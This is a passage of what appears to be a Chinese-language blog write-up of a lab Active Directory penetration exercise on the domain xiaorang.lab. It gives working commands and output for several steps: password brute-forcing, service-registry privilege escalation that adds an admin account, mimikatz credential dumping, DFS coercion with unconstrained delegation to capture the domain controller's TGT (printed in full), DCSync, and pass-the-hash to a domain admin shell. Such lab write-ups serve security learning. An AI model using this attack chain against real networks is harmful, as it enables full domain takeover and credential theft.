+<td>DC01.xiaorang.lab / DC:DC01</td>
+<td>Windows Server 2016 Datacenter 14393</td>
+<td>域控 DC</td>
+<td>88, 135, 139, 445</td>
+</tr>
+<tr>
+<td>172.22.4.19</td>
+<td>FILESERVER</td>
+<td>FILESERVER.xiaorang.lab</td>
+<td>Windows Server 2016 Standard 14393</td>
+<td>文件服务器</td>
+<td>135, 139, 445</td>
+</tr>
+<tr>
+<td>172.22.4.45</td>
+<td>WIN19</td>
+<td>XIAORANG\WIN19</td>
+<td>未明确显示系统版本</td>
+<td>成员服务器 / IIS Web</td>
+<td>80, 135, 139, 445</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<h1>WIN19</h1>
+<p>根据hint接下来要打WIN19了，爆破密码就行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─<span class="pl-c"><span class="pl-c">#</span> pc crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt --local-auth</span></pre></div>
+<p>能得到密码是babygirl1，过期的连上需要改</p>
+<p>桌面上有PrivescCheck，这是个windows提权枚举工具，里面也有检测结果，在PrivescCheck_WIN19.html</p>
+<pre class="notranslate"><code class="notranslate">Name              : gupdate
+ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
+User              : LocalSystem
+ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
+IdentityReference : BUILTIN\Users
+Permissions       : WriteDAC, ..., SetValue, CreateSubKey, ...
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+</code></pre>
+<p><strong>含义</strong>：<code class="notranslate">BUILTIN\Users</code>（Adrian 属于这个组）对 <code class="notranslate">gupdate</code> 服务的注册表键有 <strong>SetValue / CreateSubKey / WriteDAC</strong> 权限，而该服务以 <strong>LocalSystem</strong> 运行，并且 <strong>当前用户能启动它</strong>。</p>
+<p>把 <code class="notranslate">ImagePath</code> 改成我们的恶意程序，再启动服务，就能以 <strong>SYSTEM</strong> 权限执行代码，明显感觉又有点像”放大镜“了，怎么win都是这样提权的，不过这里弹窗口弹不出来的不在一个session</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate">C:\Users\Adrian<span class="pl-k">&gt;</span>reg add <span class="pl-s"><span class="pl-pds">"</span>HKLM\SYSTEM\CurrentControlSet\Services\gupdate<span class="pl-pds">"</span></span> <span class="pl-k">/</span>v ImagePath <span class="pl-k">/</span>t REG_EXPAND_SZ <span class="pl-k">/</span>d <span class="pl-s"><span class="pl-pds">"</span>cmd.exe /c net user mj 123.com /add &amp;&amp; net localgroup administrators mj /add<span class="pl-pds">"</span></span> <span class="pl-k">/</span>f
+操作成功完成。
+
+C:\Users\Adrian<span class="pl-k">&gt;</span>sc start gupdate
+[<span class="pl-k">SC</span>] StartService 失败 <span class="pl-c1">1053</span>:
+
+服务没有及时响应启动或控制请求。
+
+
+C:\Users\Adrian<span class="pl-k">&gt;</span>net user
+
+\\WIN19 的用户帐户
+
+<span class="pl-k">-------------------------------------------------------------------------------</span>
+Administrator            Adrian                   DefaultAccount
+Guest                    mj                       WDAGUtilityAccount
+命令成功完成。</pre></div>
+<p>可以看到已经有了，连上去即可，上去扒拉文件的时候看到admin下有个finalshell，但是里面没有凭据</p>
+<p>mimikatz抓hash吧</p>
+<pre class="notranslate"><code class="notranslate">mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::cache" "exit" &gt; 1.txt
+
+
+	 * Username : WIN19$
+	 * Domain   : XIAORANG
+	 * NTLM     : 4069b921a2a0478e2cb885eb1a067a7c
+	 * SHA1     : 256e9abe3555b675f11a3d9be3b15abfdb51949c
+</code></pre>
+<p>有机器账户的hash其他都没什么大作用</p>
+<h1>域</h1>
+<p>利用非约束性委派攻击域控，核心逻辑是<strong>控制一台开启了非约束性委派的机器，并强制域控主动向该机器发起 Kerberos 认证，从而捕获域控的 TGT（票据授予票据）</strong>。拿到域控 TGT 后，即可通过 Pass-the-Ticket 执行 DCSync，最终完全控制域环境</p>
+<p>（注意这边强制域控发送kerberos的时候用机器名，这样能确保走Kerberos协议）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─<span class="pl-c"><span class="pl-c">#</span> pc findDelegation.py xiaorang.lab/'WIN19$' -hashes :4069b921a2a0478e2cb885eb1a067a7c -dc-ip 172.22.4.7 </span>
+AccountName  AccountType  DelegationType  DelegationRightsTo
+-----------  -----------  --------------  ------------------
+WIN19$       Computer     Unconstrained   N/A</pre></div>
+<p>可以看到WIN19$这个机器账户有非约束性委派，接下来进攻思路就很明显了，虽然我不知道命令但是我知道思路，笑崩</p>
+<p>这里我用了好几个工具都不成功，最后用dfscoerce</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc dfscoerce.py -u WIN19$ -hashes :4069b921a2a0478e2cb885eb1a067a7c -d xiaorang.lab WIN19 172.22.4.7
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[-] Connecting to ncacn_np:172.22.4.7[\PIPE\netdfs]
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:445  ...  OK
+[+] Successfully bound!
+[-] Sending NetrDfsRemoveStdRoot!
+NetrDfsRemoveStdRoot
+ServerName:                      'WIN19\x00'
+RootShare:                       'test\x00'
+ApiFlags:                        1
+
+
+DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.
+
+C:\&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: TGT Monitoring
+[*] Target user     : DC01$
+[*] Monitoring every 1 seconds for new TGTs
+
+
+[*] 2026/9/13 2:27:47 UTC - Found new TGT:
+
+  User                  :  DC01$@XIAORANG.LAB
+  StartTime             :  2026/9/13 9:20:57
+  EndTime               :  2026/9/13 19:20:57
+  RenewTill             :  2026/9/20 9:20:57
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4a/ToE8YLfD1AsbCx29nKDParao9ZvJ6hUaWEcaFV5WZXQmSvYAW52RcgkflhTxPs1Z1nXfj04JvSRGz/RBu0U+nsfVfafbmDShEKDmo8wClDceq9wOb7MoWvM7CswYDamwO0dJy4dh7xXHUfbpFWOiLmlPTl3jpIoq1hdBfnlrkycC504IwbklwirU2txnRq4nSl2+wrSPmLdJ8DPS8ixsKbqqTX/MGmxDUpvBjB6V4wrSNWtHrbesbO2Ts2TYm42obCZHjqjfjlBvvqYIvDtWUXaVhEHLJki5TcYURwYEgJotpSHiYypcay/lNkqJFUI1+Q3YJCIWW9ixAukbZn2+pSiTi6ppYKKbK+O1M4+b14O7gT3hK0o2uqaDU/ZR13u6zMVyvT9i6Lt29rnZDWQ3Io3Ho1EkjsGbhGfg+32muKfepzDigYT4keo7PSdBpDXTPBNPDwB/b42pVCgaRIIzWEEtTGTGyFdIVROWZe9xx1T5gC7dF/6+NJAjaqTF85HYvR2nk5TyPxvyUhMGm7v0INo/6QdZX4LUlqmGcnTVv/NgBxqGKHn7ycM11SCPhtClUHjc2GgBGGBivwpK5lk6u8cInfqrbBLZUYiApn+8xEwua/fGFkoBbTxvwuDWxazbXQutS9RsRBiTfK2g/UZQKoWbS3tFr2CzNh5M2kL2gWjX+Sa2N3d9tB/+aP6WFFNjDQHXfyvii5qd0Aml+915uigVSho5FjNrhOdMfB4MHXVx/6Vj8H+xmL/2pyhcXi+IWytt//io38tYuFr2HGMLdXF/2nUd48bFcloCO8jJJhYLr6J4eEk8AtDfPD4vVvglxYGShJCri1MsYN5i+Yow4K74hrvkFxj2Vm4EADECs6Ft+c6+qp5PaophQENEmKpJu/hjWmk4iZK9w4VLUtSXBlN1S/LaKlx11vEWSsHDx26sfONhGvmY3BdtXeFhkMyqUQPWj1iod4kwfSvNLXxpqN0zTEdVltgLGfOG+wZIV1enEg2H/7EudpRVVINoN23//euCq0ppwSpKyXUrzZzHCdkRqW3omUlLp7bCteaUMAUP5xbJoX+LP2tx78G/L54ZuowEXa2ECs13GLhIsBjOwsZepbaF/t/SmFBZjL99aYyTa1m9AWgt7uPS/MzZ9z2GeA2XoetDCCuyRKR/OvoNYVefbxfPaCPVP90DsuXBYVxaJsgpnfK4smypDQUsJg7sHvddFu10vaBzpBHVJSIWZSLL1r3RJWPBnlDwqpssyf3GxSoCM+meav0ADizu753fH599mfVIYMRQaSa9z7dJt09jnh2Jt9KGxBfQTvr5W4JAdvZAT0qFr243h1njSkv77BsQosYbSPqk8xo4/iV3eA8yyOeO2aj0DuolWw9xBExsyPatdMfcCszlI1IPeeEOlcvGQYTBKZceEJWIl10haMeduwwYE5SPNPBnUKjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCA9iZBRt9ysxVuFBQnI7EcdlEcYKym7iH0hbqlUNUuDx6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDkxMzAxMjA1N1qmERgPMjAyNjA5MTMxMTIwNTdapxEYDzIwMjYwOTIwMDEyMDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
+
+[*] Ticket cache size: 1
+
+</code></pre>
+<p>抓到票据之后用rubeus导入</p>
+<pre class="notranslate"><code class="notranslate">C:\&gt;Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4a/ToE8YLfD1AsbCx29nKDParao9ZvJ6hUaWEcaFV5WZXQmSvYAW52RcgkflhTxPs1Z1nXfj04JvSRGz/RBu0U+nsfVfafbmDShEKDmo8wClDceq9wOb7MoWvM7CswYDamwO0dJy4dh7xXHUfbpFWOiLmlPTl3jpIoq1hdBfnlrkycC504IwbklwirU2txnRq4nSl2+wrSPmLdJ8DPS8ixsKbqqTX/MGmxDUpvBjB6V4wrSNWtHrbesbO2Ts2TYm42obCZHjqjfjlBvvqYIvDtWUXaVhEHLJki5TcYURwYEgJotpSHiYypcay/lNkqJFUI1+Q3YJCIWW9ixAukbZn2+pSiTi6ppYKKbK+O1M4+b14O7gT3hK0o2uqaDU/ZR13u6zMVyvT9i6Lt29rnZDWQ3Io3Ho1EkjsGbhGfg+32muKfepzDigYT4keo7PSdBpDXTPBNPDwB/b42pVCgaRIIzWEEtTGTGyFdIVROWZe9xx1T5gC7dF/6+NJAjaqTF85HYvR2nk5TyPxvyUhMGm7v0INo/6QdZX4LUlqmGcnTVv/NgBxqGKHn7ycM11SCPhtClUHjc2GgBGGBivwpK5lk6u8cInfqrbBLZUYiApn+8xEwua/fGFkoBbTxvwuDWxazbXQutS9RsRBiTfK2g/UZQKoWbS3tFr2CzNh5M2kL2gWjX+Sa2N3d9tB/+aP6WFFNjDQHXfyvii5qd0Aml+915uigVSho5FjNrhOdMfB4MHXVx/6Vj8H+xmL/2pyhcXi+IWytt//io38tYuFr2HGMLdXF/2nUd48bFcloCO8jJJhYLr6J4eEk8AtDfPD4vVvglxYGShJCri1MsYN5i+Yow4K74hrvkFxj2Vm4EADECs6Ft+c6+qp5PaophQENEmKpJu/hjWmk4iZK9w4VLUtSXBlN1S/LaKlx11vEWSsHDx26sfONhGvmY3BdtXeFhkMyqUQPWj1iod4kwfSvNLXxpqN0zTEdVltgLGfOG+wZIV1enEg2H/7EudpRVVINoN23//euCq0ppwSpKyXUrzZzHCdkRqW3omUlLp7bCteaUMAUP5xbJoX+LP2tx78G/L54ZuowEXa2ECs13GLhIsBjOwsZepbaF/t/SmFBZjL99aYyTa1m9AWgt7uPS/MzZ9z2GeA2XoetDCCuyRKR/OvoNYVefbxfPaCPVP90DsuXBYVxaJsgpnfK4smypDQUsJg7sHvddFu10vaBzpBHVJSIWZSLL1r3RJWPBnlDwqpssyf3GxSoCM+meav0ADizu753fH599mfVIYMRQaSa9z7dJt09jnh2Jt9KGxBfQTvr5W4JAdvZAT0qFr243h1njSkv77BsQosYbSPqk8xo4/iV3eA8yyOeO2aj0DuolWw9xBExsyPatdMfcCszlI1IPeeEOlcvGQYTBKZceEJWIl10haMeduwwYE5SPNPBnUKjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCA9iZBRt9ysxVuFBQnI7EcdlEcYKym7iH0hbqlUNUuDx6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDkxMzAxMjA1N1qmERgPMjAyNjA5MTMxMTIwNTdapxEYDzIwMjYwOTIwMDEyMDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
+</code></pre>
+<p>然后mimikatz直接抓域管hash就行了</p>
+<pre class="notranslate"><code class="notranslate">mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:xiaorang\Administrator
+[DC] 'xiaorang.lab' will be the domain
+[DC] 'DC01.xiaorang.lab' will be the DC server
+[DC] 'xiaorang\Administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   : 1601/1/1 8:00:00
+Password last change : 2026/9/13 9:20:52
+Object Security ID   : S-1-5-21-1913786442-1328635469-1954894845-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 4889f6553239ace1f7c47fa2c619c252
+</code></pre>
+<p>拿到域管hash了后面pth横向就行了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─<span class="pl-c"><span class="pl-c">#</span> pc impacket-wmiexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.7</span>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:445  ...  OK
+[<span class="pl-k">*</span>] SMBv3.0 dialect used
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:135  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:49666  ...  OK
+[<span class="pl-k">!</span>] Launching semi-interactive shell - Careful what you execute
+[<span class="pl-k">!</span>] Press <span class="pl-c1">help</span> <span class="pl-k">for</span> extra shell commands
+C:<span class="pl-cce">\&gt;</span>whoami
+xiaorang<span class="pl-cce">\a</span>dministrator</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
